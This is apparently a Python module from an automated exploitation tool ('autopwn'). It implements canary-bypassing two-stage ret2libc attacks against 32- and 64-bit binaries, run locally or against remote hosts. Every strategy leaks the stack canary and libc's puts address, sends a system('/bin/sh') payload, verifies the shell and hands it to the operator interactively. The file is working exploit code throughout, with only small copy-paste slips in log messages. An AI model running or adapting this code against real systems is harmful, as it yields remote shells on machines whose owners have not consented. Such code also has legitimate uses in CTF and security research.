"""P7.10 canary_ret2libc_put — 2-stage ret2libc-put with canary bypass.

Mirrors v3.1 ``ret2libc_put_canary_x32`` (L2229-2291) +
``ret2libc_put_canary_x64`` (L2357-2418) + remote variants
(L2293, L2420), with v3.1 inline canary leak replaced by
``ctx.canary`` (P5.3 output).

2-stage flow (vs P7.10 canary_ret2system):
  1. Stage 1 (leak): send ``padding + canary + filler +
     puts_plt + main + 1 + puts_got`` — the binary's main
     calls ``puts(puts@GOT)`` which prints the runtime
     address of libc's puts.  Return to main for stage 2.
  2. Parse leak: ``u32(io.recvuntil(b'\\xf7')[-4:])``
     (x32) / ``u64(io.recvuntil(b'\\x7f')[-6:].ljust(8))``
     (x64).
  3. Stage 2: send ``padding + canary + filler + system + 0
     + sh`` (x32) or ``pop_rdi + sh + ret + system`` (x64).
  4. Shell: ``io.interactive()``.

Per ``rebuild.md`` §6.8 P7.10.
"""
from __future__ import annotations

import datetime
import re

from autopwn.context import CanaryLeakPlan, ExploitContext
from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.registry import register
from autopwn.exp.strategies._canary_base import CanaryStrategy, build_canary_frame
from autopwn.primitives.ret2libc_put import Ret2LibcPutX32, Ret2LibcPutX64
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell, verify_shell_whoami


_HEX_WORD_RE = re.compile(rb"^[0-9a-fA-F]+$")


@register
class CanaryRet2LibcPutX32LocalStrategy(CanaryStrategy):
    """Canary-tainted x32 2-stage ret2libc-put — local."""

    name = "canary-ret2libc-put-x32"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = False
    requires = ("padding", "has_puts")

    def matches(self, ctx: ExploitContext) -> bool:
        return (
            ctx.binary.bit == 32
            and ctx.mode == "local"
            and bool(ctx.padding)
            and bool(ctx.has_puts)
            and (ctx.canary is not None or ctx.canary_plan is not None)
        )

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.canary is None and ctx.canary_plan is not None:
            return self._run_same_session(ctx, ctx.canary_plan)

        if ctx.canary is None:
            print_info("canary-ret2libc-put-x32: missing ctx.canary and ctx.canary_plan; skipping")
            return False

        return self._run_preleaked(ctx)

    def _run_preleaked(self, ctx: ExploitContext) -> bool:
        primitive = Ret2LibcPutX32()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-put-x32 stage1: primitive returned empty; skipping")
            return False

        from pwn import process, u32

        print_section_header("EXPLOITATION: canary ret2libc-put - x32 Local")
        print_payload("preparing canary + puts leak payload")

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            puts_addr = u32(io.recvuntil(b"\xf7")[-4:])
        except Exception as e:
            print_info(f"canary-ret2libc-put-x32 leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            print_info("canary-ret2libc-put-x32 stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))
        print_payload("stage 2: executing system('/bin/sh')")

        info = ExploitInfo(
            exploit_type="canary ret2libc-put - x32",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"CanaryRet2LibcPutX32LocalStrategy:: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True

    def _run_same_session(self, ctx: ExploitContext, plan: CanaryLeakPlan) -> bool:
        from pwn import process, u32

        primitive = Ret2LibcPutX32()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-put-x32 same-session stage1: primitive returned empty; skipping")
            return False

        print_section_header("EXPLOITATION: same-session canary ret2libc-put - x32 Local")
        print_payload("stage 0: leaking current-process canary via sequential fmtstr walk")

        io = process(str(ctx.binary.path))
        try:
            try:
                io.recv(timeout=0.5)
            except Exception:
                pass

            io.sendline(plan.leak_payload)
            leak_line = io.recvline(timeout=2) or b""
            canary_value = _parse_plan_canary(leak_line, plan)
            ctx.set_runtime_fact(
                "canary.live_value",
                canary_value,
                source="strategy.canary_ret2libc_put.same_session",
            )
            print_success(
                f"same-session canary leaked: 0x{canary_value:x} "
                f"(stack index {plan.stack_index})"
            )
            try:
                io.recv(timeout=0.5)
            except Exception:
                pass

            stage1 = build_canary_frame(
                32,
                plan.buffer_to_canary,
                canary_value,
                plan.post_canary_padding,
                _strip_padding_prefix(payload1, ctx.padding),
            )
            io.sendline(stage1)
            print_payload("stage 1: sending puts leak payload under same-session canary")

            leak_blob = io.recvline(timeout=2) or b""
            if len(leak_blob) < 4:
                print_info("canary-ret2libc-put-x32 same-session leak parse failed: short leak blob")
                return False
            puts_addr = u32(leak_blob[:4])
            ctx.set_runtime_fact(
                "libc.puts_addr",
                puts_addr,
                source="strategy.canary_ret2libc_put.same_session",
            )
            print_success(f"puts address leaked: {hex(puts_addr)}")

            payload2 = primitive.build_stage2_payload(ctx, puts_addr)
            if not payload2:
                print_info("canary-ret2libc-put-x32 same-session stage2: primitive returned empty; skipping")
                return False

            try:
                io.recvline(timeout=2)
            except Exception:
                pass
            io.sendline(plan.reentry_payload)
            try:
                io.recv(timeout=0.5)
            except Exception:
                pass

            final_payload = build_canary_frame(
                32,
                plan.buffer_to_canary,
                canary_value,
                plan.post_canary_padding,
                _strip_padding_prefix(payload2, ctx.padding),
            )
            io.sendline(final_payload)
            print_payload("stage 2: executing system('/bin/sh') and verifying with whoami")

            info = ExploitInfo(
                exploit_type="same-session canary ret2libc-put - x32",
                payload=final_payload,
                padding=ctx.padding,
                addresses={
                    "canary": hex(canary_value),
                    "puts_addr": puts_addr,
                    "stack_index": plan.stack_index,
                    "buffer_to_canary": plan.buffer_to_canary,
                    "post_canary_padding": plan.post_canary_padding,
                },
                vulnerability_type="Stack Buffer Overflow (same-session canary-bypassed)",
                architecture="x32",
                target_binary=ctx.binary.path.name,
                timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            )
            verify_ok, verify_output = verify_shell_whoami(io, keep_alive=True)
            from autopwn.core.shell_verify import record_success_verified
            ok = record_success_verified(info, verify_ok, verify_output, ctx)
            if not ok:
                print_warning(
                    "CanaryRet2LibcPutX32LocalStrategy:: same-session shell verification failed "
                    "(no valid whoami output)"
                )
                return False
            ctx.id_output = verify_output
            io.interactive()
            return True
        finally:
            try:
                io.close()
            except Exception:
                pass


@register
class CanaryRet2LibcPutX32RemoteStrategy(CanaryStrategy):
    """Canary-tainted x32 2-stage ret2libc-put — remote."""

    name = "canary-ret2libc-put-x32-remote"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = True
    requires = ("padding", "has_puts")

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-ret2libc-put-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = Ret2LibcPutX32()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-put-x32-remote stage1: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote, u32

        print_section_header("EXPLOITATION: canary ret2libc-put - x32 Remote")
        print_payload("preparing remote canary + puts leak payload")

        io = pwn_remote(host, port, ssl=ctx.ssl)  # v4.1.11
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            puts_addr = u32(io.recv(4))
        except Exception as e:
            print_info(f"canary-ret2libc-put-x32-remote leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            print_info("canary-ret2libc-put-x32-remote stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-put - x32 Remote",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"CanaryRet2LibcPutX32LocalStrategy:: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


@register
class CanaryRet2LibcPutX64LocalStrategy(CanaryStrategy):
    """Canary-tainted x64 2-stage ret2libc-put — local."""

    name = "canary-ret2libc-put-x64"
    priority = CanaryStrategy.priority
    requires_arch = 64
    requires_remote = False
    requires = ("padding", "has_puts")

    def run(self, ctx: ExploitContext) -> bool:
        primitive = Ret2LibcPutX64()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-put-x64 stage1: primitive returned empty; skipping")
            return False

        from pwn import process, u64

        print_section_header("EXPLOITATION: canary ret2libc-put - x64 Local")
        print_payload("preparing canary + puts leak payload (x64)")

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
        except Exception as e:
            print_info(f"canary-ret2libc-put-x64 leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            print_info("canary-ret2libc-put-x64 stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-put - x64",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"CanaryRet2LibcPutX32LocalStrategy:: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


@register
class CanaryRet2LibcPutX64RemoteStrategy(CanaryStrategy):
    """Canary-tainted x64 2-stage ret2libc-put — remote."""

    name = "canary-ret2libc-put-x64-remote"
    priority = CanaryStrategy.priority
    requires_arch = 64
    requires_remote = True
    requires = ("padding", "has_puts")

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-ret2libc-put-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = Ret2LibcPutX64()
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("canary-ret2libc-put-x64-remote stage1: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote, u64

        print_section_header("EXPLOITATION: canary ret2libc-put - x64 Remote")
        print_payload("preparing remote canary + puts leak payload (x64)")

        io = pwn_remote(host, port, ssl=ctx.ssl)  # v4.1.11
        io.recv()
        io.sendline(self.frame_after_canary(ctx, payload1))

        try:
            puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
        except Exception as e:
            print_info(f"canary-ret2libc-put-x64-remote leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            print_info("canary-ret2libc-put-x64-remote stage2: primitive returned empty; skipping")
            return False
        io.sendline(self.frame_after_canary(ctx, payload2))

        info = ExploitInfo(
            exploit_type="canary ret2libc-put - x64 Remote",
            payload=self.frame_after_canary(ctx, payload2),
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"CanaryRet2LibcPutX32LocalStrategy:: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


__all__ = [
    "CanaryRet2LibcPutX32LocalStrategy",
    "CanaryRet2LibcPutX32RemoteStrategy",
    "CanaryRet2LibcPutX64LocalStrategy",
    "CanaryRet2LibcPutX64RemoteStrategy",
]


def _strip_padding_prefix(payload: bytes, padding: int) -> bytes:
    if padding <= 0:
        return payload
    return payload[padding:]


def _parse_plan_canary(leak_line: bytes, plan: CanaryLeakPlan) -> int:
    words = [
        token.strip().lower()
        for token in leak_line.strip().split(b".")
        if _HEX_WORD_RE.fullmatch(token.strip())
    ]
    if plan.stack_index <= 0 or plan.stack_index > len(words):
        raise ValueError(
            f"stack index {plan.stack_index} out of range for leak line with {len(words)} words"
        )
    return int(words[plan.stack_index - 1], 16)
